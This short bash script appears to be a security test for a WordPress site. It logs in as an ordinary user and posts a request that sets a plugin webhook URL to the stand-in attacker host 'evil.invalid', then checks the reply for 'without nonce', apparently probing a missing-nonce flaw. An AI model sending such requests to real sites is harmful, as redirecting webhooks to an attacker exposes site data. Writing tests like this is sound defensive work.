#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login_user1
curl -s -b "$JAR" -X POST "$TARGET/wp-admin/admin-post.php" -d "action=bench_set_webhook&url=https://evil.invalid/hook" | grep -q "without nonce"
